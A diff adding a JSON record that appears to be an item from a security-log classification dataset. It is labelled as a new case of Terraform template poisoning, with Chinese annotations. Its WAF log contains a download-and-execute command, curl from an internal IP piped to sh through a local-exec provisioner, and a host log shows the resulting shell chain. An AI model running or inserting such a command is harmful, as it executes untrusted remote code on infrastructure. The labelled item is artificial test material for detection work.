@@ -1,0 +1,33 @@
+{
+ "unit": 1132,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "IaC 模板投毒（Terraform local-exec provisioner 执行远程脚本）",
+ "sources": [
+  "waf",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-23 20:25:50",
+   "source": "waf",
+   "log_id": "WAF0561679",
+   "content": "/api/v1/iac/apply template=main.tf local-exec=curl 10.20.5.19/tf.sh|sh Mozilla/5.0 (X11; Linux x86_64) AppleWe",
+   "event_id": "1132-WAF0561679"
+  },
+  {
+   "timestamp": "2026-07-23 20:27:48",
+   "source": "hids",
+   "log_id": "HID0608709",
+   "content": "sh tf.sh /bin/sh sh tf.sh <== /bin/sh -c 'terraform apply' <== terraform-provider-local",
+   "event_id": "1132-HID0608709"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
